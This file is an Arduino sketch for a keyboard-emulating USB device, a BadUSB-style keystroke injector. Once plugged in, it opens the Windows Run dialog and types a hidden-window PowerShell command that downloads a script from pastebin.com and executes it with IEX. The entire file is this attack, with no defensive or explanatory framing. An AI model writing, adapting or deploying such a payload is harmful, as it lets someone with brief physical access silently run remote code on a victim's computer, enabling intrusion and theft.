#include "Keyboard.h"
void typeKey(int key)
{
  Keyboard.press(key);
  delay(500);
  Keyboard.release(key);
}
void setup() {
}

void loop() {
  Keyboard.begin();

  // Wait 500ms
  delay(500);
  Keyboard.press(0);
  Keyboard.releaseAll();
  delay(800);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('d');
  Keyboard.releaseAll();
  delay(800);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(1500);
  Keyboard.print("powershell -windowstyle hidden \"IEX (New-Object Net.WebClient).DownloadString('https://pastebin.com');\"");
  delay(100);
  Keyboard.press(KEY_RETURN);
  Keyboard.end();
  for(;;){ /*empty*/ }
}




